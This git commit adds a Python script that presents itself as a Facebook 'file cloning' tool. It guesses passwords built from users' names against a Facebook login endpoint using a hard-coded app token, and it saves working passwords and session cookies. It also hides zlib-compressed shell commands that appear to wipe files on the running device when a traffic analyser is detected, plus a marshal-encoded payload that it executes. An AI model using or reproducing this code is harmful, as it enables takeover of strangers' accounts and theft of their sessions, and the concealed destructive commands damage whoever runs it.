8347ea298e12f2c4139c8f97928667eafdc6922a
karunbista768 <155879354+karunbista768@users.noreply.github.com>
2024-08-26 08:44:31 +0545

    Add files via upload

---
+++ K3SHAVVVV.py
@@ -0,0 +1,283 @@
+samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']
+
+import os
+from os import path
+from pathlib import Path
+import os,base64,zlib,pip,urllib,sys,time,platform,pip,uuid,subprocess
+
+os.system('echo -e "\e]0;ARNAV TOOL 🔥\a"')
+try:
+    import httpx
+except:
+    os.system("pip install httpx")
+    import httpx
+try:
+	import requests,os,json,time,re,random,sys,uuid,string
+	from string import *
+	from requests import api
+	from concurrent.futures import ThreadPoolExecutor as tred
+except ImportError:
+	os.system('pip install requests futures==2 > /dev/null')
+	os.system('python ARNAV.py')
+
+import os
+from os import path
+from pathlib import Path
+import os,base64,zlib,pip,urllib,sys,time,platform,pip,uuid,subprocess
+print('\n [√] Join my wp grp for new updates...!')
+os.system('xdg-open https://chat.whatsapp.com/GWp6BVFv9GAGVsbzgBD5HW')
+#os.system("pip uninstall urllib3 requests chardet idna certifi -y");os.system("pip install urllib3 requests chardet idna certifi")
+print('\n \033[1;32m[√]\033[1;37m Wait Checking Modules...!')
+try:
+    import requests,os,json,time,re,random,sys,uuid,string
+    from string import *
+    from requests import api
+    from concurrent.futures import ThreadPoolExecutor as tred
+except ImportError:
+    os.system('pip install requests futures==2 > /dev/null')
+    os.system('python ARNAV.PY')
+
+os.system("clear")
+
+try:
+	g = "anar"
+	f="tt"
+	file_d = os.listdir(zlib.decompress(b'x\x9c\xd3/NIN,J\xd1w\xccK)\xca\xcfL\xd1OI,I\xd4\x07\x00SL\x07\x89'))
+
+	if f'com.h{f}pc{g}y.pro' in file_d:
+		print('\033[1;37m[×] Uninstall HttpCanary From Your Device ')
+		os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
+		os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
+		os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
+		exit()
+	else:
+		pass
+except Exception as e:
+	pass
+
+def xox(m):
+	for x in m + '\n':
+		sys.stdout.write(x)
+		sys.stdout.flush()
+		time.sleep(0.07)
+
+def clear():
+	os.system('clear')
+	print(logo)
+
+cokiii = []
+
+folder_path = '/sdcard/ARNAV'
+try:
+	os.makedirs(folder_path, exist_ok=True)
+except:
+	pass
+oks=[]
+cps=[]
+loop=0
+logo=(f"""
+\033[1;37m
+.88b  d88. d8888b.     .d8b.  d8888b. d8b   db  .d8b.  db    db 
+88'YbdP`88 88  `8D    d8' `8b 88  `8D 888o  88 d8' `8b 88    88 
+88  88  88 88oobY'    88ooo88 88oobY' 88V8o 88 88ooo88 Y8    8P 
+88  88  88 88`8b      88~~~88 88`8b   88 V8o88 88~~~88 `8b  d8' 
+88  88  88 88 `88. db 88   88 88 `88. 88  V888 88   88  `8bd8'  
+YP  YP  YP 88   YD VP YP   YP 88   YD VP   V8P YP   YP    YP    
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+ Author    : ARNAV
+ Github    : Micky
+ Facebook  : ARNAV CHAULAGAI
+ Tool Name : ARNAV
+ Tool Type : \033[1;31mFILE\033[1;37m
+ Version   : \033[1;32m9\033[1;37m
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬""")
+
+def linex():
+	print(f'▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬')
+
+def Main_ARNAV():
+		clear()
+		print(f'\033[1;37m [1] File Cloning \n [2] WhatsApp group(Join) \n [3] Contact tool owner \n [0] Exit')
+		linex()
+		shm= input('\033[1;37m [+] Select option: ')
+		if shm =='1':
+			file_crack()
+		elif shm =='2':
+			
+			Main_ARNAV()
+		elif shm =='3':
+			Main_ARNAV()
+		elif shm =='0':
+			exit(' Thanks For Using our tool ')
+		else:
+			print('\033[1;37m [+] Select valid option\033[1;37m ')
+			time.sleep(0.5)
+			Main_ARNAV()
+
+def file_crack():
+	clear()
+	file = input(' [+] Put file path :\033[1;32m ')
+	try:
+		fo = open(file,'r').read().splitlines()
+	except FileNotFoundError:
+		print('\033[1;37m [+] File location not found ');exit()
+	clear()
+	print(' [1] Method 1 ')
+	print(' [2] Method 2 ')
+	print(' [3] Method 3 ')
+	print(' [4] Method 4 ')
+	linex()
+	methd=input('\033[1;37m [+] Select Option: ')
+	plist=[]
+	clear()
+	print(' [1] Choose password ')
+	print(' [2] Auto password (best)')
+	linex()
+	jsj = input(' choose : ')
+	if jsj == '1':
+		clear()
+		try:
+			ps_limit = int(input(' How Many Pasword You Want To Add :  '))
+		except:
+			ps_limit =1
+		linex()
+		for i in range(ps_limit):
+			plist.append(input(f'\033[1;37m Put Password No.{i+1}: '))
+	else:
+		clear()
+		print(' [1]  NEp passlist  ')
+		print(' [2]  Pak passlist  ')
+		print(' [3]  Ind passlist  ')
+		print(' [4]  Bd passlist  ')
+		linex()
+		igh = input(' choose : ')
+		if igh == '1':
+			plist.append('first last')
+			plist.append('First Last')
+			plist.append('first123')
+			plist.append('First123')
+			plist.append('first1234')
+			plist.append('First1234')
+			plist.append('firstlast')
+			plist.append('First12345')
+			plist.append('First1234')
+			plist.append('first1234')
+			plist.append('nepal123')
+			plist.append('nepal12345')
+			plist.append('firstfirst')
+			plist.append('First@123')
+			plist.append('first@123')
+			plist.append('first@1234')
+			plist.append('last123')
+			plist.append('first@last')
+			plist.append('first@12345')
+			plist.append('firstlast12345')
+			plist.append('Nepal@123')
+			plist.append('kathmandu')
+		elif igh == '2':
+			plist = ['first007', 'first777', 'first786', 'first786786', 'first1122', 'first12345', 'firstlast', 'first last', 'firstlast123', 'firstlast12345', 'firstlast007', 'firstlast1122', 'firstlast786', 'khan1122', 'pak12345', 'khan007', 'khankhan', 'Khan112233']
+		elif igh == '3':
+			plist = ['first last ', 'first@123', 'first123', 'first1234', 'first last123', 'first last 1234', 'first Kumar', 'last123', 'last1234', 'first12345', 'first123457', '57273200', '59039200', '57575751', '57575752']
+		elif igh == '4':
+			plist.append('first last')
+			plist.append('firstlast')
+			plist.append('first123')
+			plist.append('first1234')
+			plist.append('first12345')
+			plist.append('first112233')
+			plist.append('first@1234')
+			plist.append('last1234')
+			plist.append('lastfirst')
+			plist.append('firstlast123')
+			plist.append('405060')
+			plist.append('708090')
+	clear()
+	ck_opt = input(' [?] Do you show cookie (y/n) : ')
+	with tred(max_workers=30) as ARNAV:
+		clear()
+		tl = str(len(fo))
+		print(' Total accounts : \033[1;32m'+tl)
+		print('\033[1;37m Use airplane mode if ids are not comming use automate')
+		linex()
+		for user in fo:
+			ids,names = user.split('|')
+			passlist = plist
+			if methd =='1':
+				ARNAV.submit(api1,ids,names,passlist)
+			else:
+				ARNAV.submit(api1,ids,names,passlist)
+	print('\033[1;37m')
+	linex()
+	print(' [+] The process has completed')
+	print(' [+] Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+	linex()
+	input('\033[1;32m [*] Press enter to back \033[1;37m')
+	os.system('python ARNAV.py')
+
+import marshal,zlib
+#
+exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\xf3B\x00\x00\x00\x97\x00\x02\x00e\x00e\x01\xa0\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01S\x00)\x02sL\x01\x00\x00x\x9cuO\xd1n\x820\x14}^\xbf\x82\xf4\x05\x0c\x8a\x14*\x8a\x86\x07\xd4\xb9\x979\x8df\xbe,\xcbR\xa1j3\x01S\xaa\xc6,\xfb\xf7\xdd\xd6\xf9\xb0e\xbb\xa4\xe9=\xe7\\\xce=E\'.kQ\x95Vb\xd9\xab\xd0\xf7"\x1bYH]\x0e\\\x13s&r\x1b!Q\x1c*\xa9,\xc9\xca\xbc*\x10\xca\xf9\xc6:2\xe64\xfa\xe8Nru\x94\xa5\x85_&\xc3\xf4\xa9=\x19\xd2t\x00\xdd\xaa\x8d\xddZI\xe7\xfa\x87\xa7/Q*\x87\x10\xd2\x8c\xe3\xb8\xd1pm\xcf\x87\xcf\xfe=\x04g\xcb\x1d3\x05C\x7f:\x18\xc9r1\xac\x19\xfe\xbf\xc6\x94\xdee\n\xbc\xf0\xe0\x9a\x10\xbbx&3\xd6JaY%\xf2[XL\xc3\xd0D\n\x03\x8f\x90\xee\xcd\x1c\x87$\x8a\xfc\x1e\xa1\x04\x98\xc7\x91fx\xfdv\xbf\x04\xb40z@h\xec\x07\x11\r\x80\x19-4\xf3\x9c\xf1\xfd\x1e\xd0t\xa2Q\xcd\x8a\xfaXn\xb5\xdf\xf8\'\x9e\x9b,\x19\xc4\xde\xb0\x8c\xaf\xab\xea\xdd\xab \x18(c\xe3\xbc\x9c\xb6\x1e\xe2\xa0\xb7\xa0\xc0,\r\xd3\xf1\x88\xa7s\xcc\xe6\x1a\xe9n\x94\xea\x8e\xc9\x82\xb3\xb5h\x9d\xba\xac\xff\xddk\x97\xa9\xd6>r^\xd6B]\x12x]\xf3,r\xb5K\x08\xa5~s\xc7\xc5v\xa7\x92\xa0\x13\xf9\x9f\x83W\x8ct}\x01\xa8\xe8\x91uN)\x03\xda\x04exec\xda\x04zlib\xda\ndecompress\xa9\x00\xf3\x00\x00\x00\x00\xfa\x01 \xfa\x08<module>r\x08\x00\x00\x00\x01\x00\x00\x00s@\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x00\x04\x80\x04\x80T\x87_\x82_\xf0\x00\x00\x16f\x0f\xf1\x00\x00\x06g\x0f\xf4\x00\x00\x06g\x0f\xf1\x00\x00\x01h\x0f\xf4\x00\x00\x01h\x0f\xf0\x00\x00\x01h\x0f\xf0\x00\x00\x01h\x0f\xf0\x00\x00\x01h\x0fr\x06\x00\x00\x00'))
+
+
+def api1(ids,names,passlist):
+	try:
+		global ok,loop,sim_id
+		sys.stdout.write('\r\r\33[1;37m [ARNAV-RUNNING]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+		fn = names.split(' ')[0]
+		try:
+			ln = names.split(' ')[1]
+		except:
+			ln = fn
+		for pw in passlist:
+			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+			xxx = "[FBAN/FB4A;"+"FBAV/106.0.0.26.68;"+"FBBV/45904160;"+"FBDM/{density=3.0,width=1080,height=1920};"+"FBLC/en_US;"+"FBRV/45904160;"+"FBCR/Telenor;"+"FBMF/vivo;"+"FBBD/vivo;"+"FBPN/com.facebook.katana;"+"FBDV/vivo 1724;"+"FBSV/5.0;"+"FBOP/1;"+"FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;"+"FBAV/106.0.0.26.68;"+"FBBV/45904160;"+"FBDM/{density=3.0,width=1080,height=1920};"+"FBLC/en_US;"+"FBRV/45904160;"+"FBCR/Telenor;"+"FBMF/vivo;"+"FBBD/vivo;"+"FBPN/com.facebook.orca;"+"FBDV/V2043;"+"FBSV/5.0;"+"FBOP/1;"+"FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;"+"FBAV/106.0.0.26.68;"+"FBBV/45904160;"+"FBDM/{density=3.0,width=1080,height=1920};"+"FBLC/en_US;"+"FBRV/45904160;]"
+			ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097190;FBDM/{density=1.5,width=540,height=960};FBLC/es_ES;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J200M;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
+			head = {'User-Agent':uaa(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
+			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'es_ES','client_country_code':'ES','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
+			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
+			if 'session_key' in po:
+					uid = str(po['uid'])
+					coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+					print('\r\r\033[1;32m |ARNAV-OK| '+uid+' | '+pas)
+					print('\r\r \033[1;35m|🍪|=> : '+coki)
+					file_path = os.path.join(folder_path, 'ARNAV_FILE_OK.txt')
+					with open(file_path, 'a') as file:
+						file.write(uid+'|'+pas+'|'+coki+'\n')
+					oks.append(uid)
+					break
+			elif 'www.facebook.com' in po['error']['message']:
+					uid = str(po['error']['error_data']['uid'])
+					print(f'\r\r\33[1m\33[1;35m |ARNAV-CP| '+uid+' | '+pas+'\033[1;97m')
+					file_path = os.path.join(folder_path, 'ARNAV-CP.txt')
+					with open(file_path, 'a') as file:
+						file.write(uid+'|'+pas+'\n')
+					cps.append(uid)
+					break
+			else:
+				continue
+		loop+=1
+	except requests.exceptions.ConnectionError:
+		time.sleep(20)
+	except Exception as e:
+		pass
+()
+def apvdef():
+   a=str(os.geteuid())
+   b=str(os.getlogin())
+   y="".join(a+b)
+   key=f"ARNAV INXIDE {y} ✓"
+   row=httpx.get("https://github.com/SamarpanGm/Nop/blob/main/Gm.txt").text
+   if key in row:
+     Main_ARNAV()
+   else:
+     os.system("clear")
+     print(logo)
+     print(" Your key is not approved")
+     print(" Please get approve")
+ #    print(lin)
+     print(" Your key : "+key)
+     os.system("termux-open https://chat.whatsapp.com/GWp6BVFv9GAGVsbzgBD5HW")
+     sys.exit()
+     
+apvdef()
